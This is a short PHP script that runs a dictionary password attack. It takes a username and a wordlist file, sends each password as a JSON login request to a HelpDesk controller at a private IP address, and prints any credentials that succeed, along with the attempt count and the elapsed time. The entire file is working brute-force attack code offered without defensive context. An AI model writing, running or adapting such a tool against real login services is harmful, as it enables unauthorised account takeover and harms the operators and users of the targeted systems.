<?php
	// Given username and wordlist file as the 2 arguments, tries every combination 
	// on the given server at the makeURL function

	$username = $argv[1];
	$file = $argv[2];

	$counter = 0;
	$start = microtime(true);

	$handle = fopen($file, "r");
	if ($handle) {
		while (($line = fgets($handle)) !== false) {
			$password = rtrim($line);
			if (test_password($username, $password)) { break; }
			$counter++;
		}
		fclose($handle);
	} else {
		// error opening the file.
	}

	$end = microtime(true);
	$elapsed = $end - $start;
	$formattedTime = number_format($elapsed, 2, ".", " ");
	echo "Tried " . $counter . " passwords in " . $formattedTime. " seconds.\n";

	function test_password($username, $password) {
		$json = array("mode"=>"login", "username"=>$username, "password"=>$password);
		$result = sendJSON(makeURL($json));

		if ($result["message"] === "OK") {
			echo "USERNAME: " . $username . " PASSWORD: " . $password . "\n";
			return true;
		}
		return false;
	}

	function makeURL($array) {
		$url = "192.168.0.205/HelpDesk/HDcontroller.php?obj={";
		foreach($array as $key => $value) {
			$url .= "\"" . $key . "\":\"" . $value . "\",";
		}
		$url = rtrim($url, " ,") . "}";
		return str_replace( " ", "%20", $url); // whitespaces to proper url
	}

	function sendJSON($url) {

		$curlSession = curl_init();
		curl_setopt($curlSession, CURLOPT_URL, $url);
		curl_setopt($curlSession, CURLOPT_BINARYTRANSFER, true);
		curl_setopt($curlSession, CURLOPT_RETURNTRANSFER, true);
		$result = json_decode(curl_exec($curlSession), true);
		return $result;
	}

?>
